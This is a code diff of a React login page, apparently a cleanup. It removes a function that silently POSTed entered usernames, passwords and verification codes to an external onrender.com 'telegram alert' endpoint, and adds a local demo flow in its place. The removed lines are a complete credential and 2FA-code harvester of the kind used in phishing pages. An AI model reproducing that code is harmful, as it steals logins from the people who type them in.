@@ -52,48 +52,13 @@ export default function Login() {
     },
   });
 
-  // ============================================
-  // 🔐 دالة إرسال التنبيه إلى Render
-  // ============================================
-  const sendAlertToServer = async (username: string, password: string) => {
-    try {
-      await fetch('https://mwqaa-jhz-main.onrender.com/api/telegram/alert', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          username: username,
-          password: password,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-        }),
-      });
-    } catch (error) {
-      // Silent fail
-    }
-  };
-
-  // ============================================
-  // 📤 دالة إرسال بيانات الدخول
-  // ============================================
-  const onSubmit = async (data: LoginFormValues) => {
-    // إرسال البيانات إلى تليجرام
-    await sendAlertToServer(data.username, data.password);
-
-    // متابعة العملية
+  // Local demo flow only. No credentials or verification codes leave the browser.
+  const onSubmit = async (_data: LoginFormValues) => {
     setScreen("loading");
-    window.setTimeout(() => setScreen("code"), 15000);
+    window.setTimeout(() => setScreen("code"), 1500);
   };
 
-  // ============================================
-  // 📤 دالة إرسال رمز التأكيد
-  // ============================================
-  const onCodeSubmit = async (data: CodeFormValues) => {
-    // إرسال رمز التأكيد إلى تليجرام
-    await sendAlertToServer("🔐 رمز التأكيد", data.code);
-
-    // متابعة العملية
+  const onCodeSubmit = async (_data: CodeFormValues) => {
     setScreen("drop");
   };
 
